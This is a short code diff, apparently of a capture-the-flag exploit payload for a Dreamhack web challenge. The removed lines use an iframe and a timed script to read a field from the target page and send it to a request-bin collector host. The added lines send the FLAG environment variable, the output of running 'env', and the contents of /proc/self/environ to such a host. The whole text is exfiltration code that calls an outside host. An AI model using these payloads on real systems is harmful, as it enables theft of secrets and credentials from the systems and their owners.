@@ -1,11 +1,7 @@
-<iframe src="http://web:8080/index.html" onload="stealFlag()" id="target"></iframe>
 <script>
-  fetch("https://vvuipmj.request.dreamhack.games?flag=A");
-  function stealFlag() {
-    setTimeout(() => {
-      var input = document.getElementById("target").contentWindow.document.querySelector("#input");
-      fetch("https://vvuipmj.request.dreamhack.games?flag=" + input.value);
-    }, 6000); // 6초 후 실행
-  }
-  fetch("https://vvuipmj.request.dreamhack.games?flag=A");
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=A");
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(process.env.FLAG));
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(require('child_process').execSync('env').toString()));
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(require('fs').readFileSync('/proc/self/environ', 'utf8')));
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=A");
 </script>
